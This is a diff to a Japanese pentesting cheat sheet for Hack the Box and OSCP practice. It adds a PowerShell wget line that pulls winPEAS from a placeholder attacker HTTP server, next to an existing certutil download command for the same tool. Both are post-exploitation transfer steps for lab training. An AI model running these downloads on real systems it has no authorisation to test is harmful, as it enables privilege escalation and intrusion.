@@ -1,4 +1,4 @@
-## CheetSheet
+c## CheetSheet
 
 Hack the Box の攻略や、OSCP 取得を目指すためのチートシートです。
 悪用厳禁でお願いします><
@@ -1344,6 +1344,10 @@ search -f user.txt
 exe: 欲しいファイルが winPEAS64.exe
 Linux で port 8000 で simpleHttpserver起動後
 
+1. powershell あり
+powershell -c wget "http://ip:8000/winPEASx86.exe"
+
+2. powershell  なし
 certutil -urlcache -f http://ip:8000/winPEASx64.exe winPEASx64.exe
 
 -f: 特定の URL のフェッチとキャッシュの更新を強制する。
